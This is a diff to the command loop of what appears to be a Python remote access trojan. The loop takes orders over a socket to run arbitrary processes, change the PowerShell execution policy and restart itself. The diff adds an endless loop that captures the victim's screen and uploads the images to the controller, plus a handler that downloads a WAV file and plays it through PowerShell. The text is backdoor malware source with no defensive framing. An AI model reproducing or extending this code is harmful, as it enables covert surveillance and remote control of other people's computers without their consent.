@@ -860,8 +860,14 @@ def shell():
                     reliable_send('Now you will be able now to run powershell script')
                     changeexecutionpolicy()
                 elif command[:15] == 'ssharescreen':
-
-                    stopscreenshare()
+                    while True:
+                        try:
+                            time.sleep(1)
+                            screenshot()
+                            upload_file(appd + '\\screen.png')
+                            os.remove(appd + '\\screen.png')
+                        except:
+                            continue
                 elif command[:5] == 'start':
                     try:
                         subprocess.Popen(command[6:], shell=True)
@@ -976,6 +982,19 @@ def shell():
 
                         os.startfile(sys.executable)
                         sys.exit()
+                elif command[:9] == 'playsound':
+                    if s.recv(1024).decode() == 'nsupport':
+                        try:
+                            s.send('[-] This module Support only Wav files'.encode())
+                            pass
+                        except:
+                            continue
+                    else:
+                        try:
+                            download_file(appd + '\\sound.wav')
+                            subprocess.Popen("powershell -c  $PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation='" + appd + "\\sound.wav';$PlayWav.playsync()",shell=True)
+                        except:
+                            continue
 
                 else:
 
